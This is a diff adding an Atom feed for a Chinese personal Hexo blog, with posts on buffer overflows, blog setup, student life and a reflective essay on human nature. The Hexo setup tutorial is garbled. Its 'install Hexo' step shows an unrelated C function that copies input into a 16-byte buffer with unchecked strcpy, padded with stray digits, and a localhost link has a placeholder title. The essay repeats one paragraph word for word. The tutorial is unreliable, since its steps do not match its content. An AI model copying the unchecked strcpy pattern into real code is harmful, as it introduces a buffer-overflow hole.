+      &lt;p&gt;缓冲区溢出是一种非常普遍、非常危险的漏洞。它有多种英文名称，如buffer overflow、buffer overrun、smash the stack、trash the stack等等，它也是一种比较有历史的漏洞，多个著名的漏洞报告都和缓冲区溢出有关，在各种操作系统、
+    
+    </summary>
+    
+    
+      <category term="blog" scheme="CodingCockroach.com/tags/blog/"/>
+    
+      <category term="技术" scheme="CodingCockroach.com/tags/%E6%8A%80%E6%9C%AF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>未成年请在父母陪同下观看</title>
+    <link href="CodingCockroach.com/2016/05/13/%E6%9C%AA%E6%88%90%E5%B9%B4%E8%AF%B7%E5%9C%A8%E7%88%B6%E6%AF%8D%E9%99%AA%E5%90%8C%E4%B8%8B%E8%A7%82%E7%9C%8B/"/>
+    <id>CodingCockroach.com/2016/05/13/未成年请在父母陪同下观看/</id>
+    <published>2016-05-12T16:00:00.000Z</published>
+    <updated>2016-05-24T16:44:06.622Z</updated>
+    
+    <content type="html">&lt;p&gt;最近也还是老样子，不思上进，在团队写一写代码，偶尔打打游戏。不过感觉五一放假回来课真心多，没什么时间用来总结，博客的搭建也落下了，等数理方程考试完再说吧ヽ(‘ ∇‘ )ノ。&lt;br&gt;放假逛了逛各位菊苣的博客，发现了好多好多有趣的东西2333，让我们看看都有啥~&lt;br&gt;①Emoji!&lt;br&gt;②ManInTheDark&lt;br&gt;③FM&lt;br&gt;④Our Love Story&lt;br&gt;第一个准备用来做自己域名邮箱的登陆背景，第三个是一个弹幕FM，我感觉挺好用的，大家可以试一试，同时这也是一个开源项目，地址大家可以自己看源码啦。&lt;br&gt;嘿嘿嘿，第四个其实是纪念日送给妹纸的，也放上来不要见怪~&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;最近也还是老样子，不思上进，在团队写一写代码，偶尔打打游戏。不过感觉五一放假回来课真心多，没什么时间用来总结，博客的搭建也落下了，等数理方程考试完再说吧ヽ(‘ ∇‘ )ノ。&lt;br&gt;放假逛了逛各位菊苣的博客，发现了好多好多有趣的东西2333，让我们看看都有啥~&lt;br&gt;①Emo
+    
+    </summary>
+    
+    
+      <category term="随笔" scheme="CodingCockroach.com/tags/%E9%9A%8F%E7%AC%94/"/>
+    
+      <category term="blog" scheme="CodingCockroach.com/tags/blog/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Let&#39;s Hexo!</title>
+    <link href="CodingCockroach.com/2016/03/22/hexo/"/>
+    <id>CodingCockroach.com/2016/03/22/hexo/</id>
+    <published>2016-03-22T08:45:00.000Z</published>
+    <updated>2016-05-24T03:31:38.627Z</updated>
+    
+    <content type="html">&lt;p&gt;好不容易搭建起了自己的第一个个人博客，也纠结了很久是不是应该直接用CSDN，cnblogs或者自己搭wordpress，最后跟随知乎大神的脚步开始了我的Hexo征程。&lt;br&gt;Hexo出自台湾大学生tommy351之手，这是一个基于Node.js的静态博客程序。搭建完成后，它能够一键在几秒内完成上百个页面的渲染，渲染完成后也只需一条指令即可部署到 GitHub Pages, Heroku 或其他网站。而且还有各种风格的主题支持，让我们免去了很多搭建博客和维护博客的工作。&lt;/p&gt;
+&lt;p&gt;在此以Windows讲述Hexo的具体搭建过程，下面开始进入正题：&lt;/p&gt;
+&lt;p&gt;环境准备&lt;br&gt;1.安装Node.js：&lt;br&gt;到Node.js官网下载相应平台的最新版本，一路安装即可。&lt;br&gt;2.安装Git：&lt;br&gt;大家可以到官网下载或者安装绿色版自己设置环境变量。&lt;br&gt;3.安装Sublime或者Notepad++（可选）：&lt;br&gt;Sublime&lt;br&gt;Notepad++&lt;/p&gt;
+&lt;p&gt;搭建博客：&lt;br&gt;注，以下命令行需要在Git终端中执行（右键单击-&amp;gt;Git Bash Here）。&lt;br&gt;1.安装Hexo：&lt;br&gt;987654321&lt;code&gt;void function(char *input)   
+{   
+char buffer[16];   
+strcpy(buffer,input);   
+}&lt;/code&gt;123456789&lt;/p&gt;
+&lt;a href=&quot;http://localhost:4000/2016/03/22/hexo/&quot; title=&quot;[external] [title]&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;tommy351&lt;/a&gt;</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;好不容易搭建起了自己的第一个个人博客，也纠结了很久是不是应该直接用CSDN，cnblogs或者自己搭wordpress，最后跟随知乎大神的脚步开始了我的Hexo征程。&lt;br&gt;Hexo出自台湾大学生tommy351之手，这是一个基于Node.js的静态博客程序。搭建完成后，它
+    
+    </summary>
+    
+    
+      <category term="blog" scheme="CodingCockroach.com/tags/blog/"/>
+    
+      <category term="技术" scheme="CodingCockroach.com/tags/%E6%8A%80%E6%9C%AF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>看哪，这人</title>
+    <link href="CodingCockroach.com/2016/03/18/%E7%9C%8B%E5%93%AA%EF%BC%8C%E8%BF%99%E4%BA%BA/"/>
+    <id>CodingCockroach.com/2016/03/18/看哪，这人/</id>
+    <published>2016-03-18T01:20:55.000Z</published>
+    <updated>2016-03-19T07:11:31.256Z</updated>
+    
+    <content type="html">&lt;p&gt;人的本性&lt;br&gt;人的一切来源于宇宙，组成人的所有物质宇宙里都有，也许这种叫做人类生命的物质组合宇宙里也有。生命的特征是遗传与变异，人类的文化的特征是模仿与创新。除了人自己以外，目前看来，没有什么别的东西对人感兴趣。人类除了在宇宙里存在下去以外，并无什么说得上的共同的目标。至于人类的终极目标，是词语误用，因“终极”这个词语没有内容，人类只能看到或谈到有限的将来。人类创造的文化可以总的概括为，对人类自己的责任。人的大脑是一部做梦机器，它漫无边际地巡航在自我与环境之间，它试图弄清两者之间的关系，不过那不是很容易，无论是人自身，还是人周围的环境，都比较开放，可从多方面多角度理解。但人的意识有其指向性，当他集中自己的能量，去关注一个问题时，便能有机会化繁为简，使那个问题渐渐明晰，从而解决它，这是人类生存下来的根本，也是智力之源。人与人之间能够因共同的信念及梦想组成共同体，这个共同体像人的手脚一样有分工，利用约定与制度相互协作，使人的工作更有效率。人在进化，它的意思是指，人的意识状态是可以提高的，它表现为更快地适应环境，更高的智力，更好的体力，更强地提出问题与解决问题的能力，更好的洞见，也就是预见能力。人类生存的乐趣主要源于对意义的捕捉与放弃，以此，形成了文化的所有层面。人类在哲学上的争论主要围绕着两个问题进行：其一是语言问题，其二是人类的洞见对准的是必然的未来，还是或然的未来，这是宗教、哲学、科学总要试图回答的问题。好了，上面谈的是我们人类已经知道的，简单地说成是人的本性吧。从这里出发，我想谈一谈“人生的意义”，当然，你可以把意义理解成“趣味”，或者是“重要性”，怎么说都行得通。&lt;br&gt;挑战&lt;br&gt;对我来讲，把生命看成是一种挑战而不是一种凑合远为合理，因这使我更加意识到我的不完美，并帮助我改进，特别是，它还能激发起我的斗志，让我感到人生被某种意义充实着，事实上，我认为那意义正是我们与环境互动的产物。我注意到，以往每当我跟别人一起学什么充实或玩什么，而别人很不认真时，我都会生气，在我看来，虽然在过程中遇到那些困难是显而易见的，然而克服那些困难也是显而易见的，总会有方法越过那些障碍。但我发现多数人对此没有兴趣，他们越过困难多半凭运气，如果没有越过，他们多半是找各种借口，最后，当他们退无可退的时候，便对那件事失去兴趣了，总之，他们会把对自己的失望投射到他们所从事的事情上。&lt;br&gt;机器&lt;br&gt;我上中学时参加看体校摔跤队，分给我一个对练伙伴，我当时四十公斤，他与我一样高，比我大两岁，却比我重十公斤。进队前，他练的是举重，我练的是跳高，他比我早进队一个月，因他总是弄伤别人，所以无人愿意跟他搭伴，教练把他分给我，一开始，我被当作沙袋，任他摔打，我当时就注意到，他摔我摔得很痛，他的动作十分生硬。两星期后，教练教动作，我才发现他的动作是错的，我告诉了他，但他却不以为意，因为他每次都能轻松地赢我，他的力气很大，当他抓住我时，我完全无法动一动。 一个月后，我发现他的力气并不是源源不断的，当我与他扭在一起，持续一分钟后，他便抓不住我了，因此我有机会使用正确的摔跤动作把他摔倒。起初，他感到十分吃惊，但仍不相信自己的动作是错的，我一步一步分解做给他看，且让教练看，教练说我是对的，他是错的，让他按照我的动作改，但他一点也不改，以后，我与他摔跤，赢面越来越大，后来发展到摔十次可以赢下七到八次。他比我重十公斤，参加比赛比我高三个级别，应该每一次都赢过我，但他却不承认这个明显的事实，只是嘴上说我摔得好，私下里并不改动作，直至我离队，他一直没能摔过我。这件事让我非常不解，明明他改一改动作，就能轻松地赢我，为何他就是不改呢？况且他很好胜，总想赢，甚至比我还想赢。最令我不解的是，最终他宁可承认我比他摔得好，却不承认他的动作是错的。更叫我生气的是，他最终躲着我，不爱跟我摔了，因我总是督促他改动作，他一听就烦。    赢了他一点也不叫我高兴，反倒叫我很愤怒，我后来直接叫他笨蛋，他开始听着还跟我急，我们俩打过两架，最终因打不过我，连反抗都停止了，只是不理我。每天我们尴尬地练习，他任由我一次次摔倒，到我离队时，他跟我摔十次输十次，已对跟我比赛完全没有信心。&lt;br&gt;我认为他缺乏学习能力，也就是纠错能力，他像是一部机器。&lt;br&gt;技巧&lt;br&gt;记得物理学家费曼说过，数学从某种意义上来讲，就是计数，古人能通过数豆子来计数，很多现代意义的数学其实质仍是数豆子，有一种方式，你可以像古人一样一颗一颗数来做计算，还有一种方式，就是你花十几年时间学习一些计算技巧，而依靠这些技巧可帮助你数得快。很多人总觉得这两件事是一样的，我认为，生而为人的智慧之一，就是能寻求某种方法，也就是提高你做某一件事的技巧，从而让你具有更好的应变能力及效率。    对于掌握那些技巧，很多人尝试过，经历了失败，心里暗中觉的非常困难，他们中的绝大多数，不是设法攻克难关，而是用语言来消解那种困难，或是把那种技巧说得很无意义。我认为他们从根本上不相信自己是一个有智慧的人，他们不相信通过努力能够达成目标，他更倾向于一种孩童似的幼稚想法，认为船到桥头自然直，当他们撞到桥上以后，他们便怪运气不好，甚至能形而上到相信人生在本质上就是一种运气，他们完全地忽略了人的自由意志，其实他们真正需要的只是静下心来，花点时间及努力掌握一点技巧。    对我来讲，把生命看成是一种挑战而不是一种凑合远为合理，因这使我更加意识到我的不完美，并帮助我改进，特别是，它还能激发起我的斗志，让我感到人生被某种意义充实着，事实上，我认为那意义正是我们与环境互动的产物。    我注意到，以往每当我跟别人一起学什么充实或玩什么，而别人很不认真时，我都会生气，在我看来，虽然在过程中遇到那些困难是显而易见的，然而克服那些困难也是显而易见的，总会有方法越过那些障碍。但我发现多数人对此没有兴趣，他们越过困难多半凭运气，如果没有越过，他们多半是找各种借口，最后，当他们退无可退的时候，便对那件事失去兴趣了，总之，他们会把对自己的失望投射到他们所从事的事情上。&lt;br&gt;难事&lt;br&gt;在生活中我也发现，凡是在一件一般所谓的“难事”上成功过的人，很容易在别的难事上再获得成功。而绝大多数人，是那种从未在任何一件“难事”上成功的人，其实他们只需努力一次便可改变整个情况。&lt;br&gt;我认为，他们陷入了一种悖论，他们不肯改正自己的错误，而把自己的失败投射到外在的事物当中，他们认为所有的一切都是失败，他们从未想到，当他们成功了，人生便会展现出另外一种面貌。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;人的本性&lt;br&gt;人的一切来源于宇宙，组成人的所有物质宇宙里都有，也许这种叫做人类生命的物质组合宇宙里也有。生命的特征是遗传与变异，人类的文化的特征是模仿与创新。除了人自己以外，目前看来，没有什么别的东西对人感兴趣。人类除了在宇宙里存在下去以外，并无什么说得上的共同的目标。至
+    
+    </summary>
+    
+    
+      <category term="随笔" scheme="CodingCockroach.com/tags/%E9%9A%8F%E7%AC%94/"/>
+    
+      <category term="blog" scheme="CodingCockroach.com/tags/blog/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="CodingCockroach.com/2016/03/18/HelloWorld/"/>
+    <id>CodingCockroach.com/2016/03/18/HelloWorld/</id>
+    <published>2016-03-18T01:16:37.000Z</published>
+    <updated>2016-03-18T01:29:03.939Z</updated>
+    
+    <content type="html">&lt;pre&gt;&lt;code&gt;作为一个只会撸后台代码的人，入坑自己建立自己的个人博客是因为从知乎上看的毒文，两天的奋战总归是搭起来一个还能看的页面，用这篇文章纪念一下吧，以此共勉。
+&lt;/code&gt;&lt;/pre&gt;</content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;作为一个只会撸后台代码的人，入坑自己建立自己的个人博客是因为从知乎上看的毒文，两天的奋战总归是搭起来一个还能看的页面，用这篇文章纪念一下吧，以此共勉。
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+    
+      <category term="随笔" scheme="CodingCockroach.com/tags/%E9%9A%8F%E7%AC%94/"/>
+    
+      <category term="blog" scheme="CodingCockroach.com/tags/blog/"/>
+    
+  </entry>
+  
+</feed>
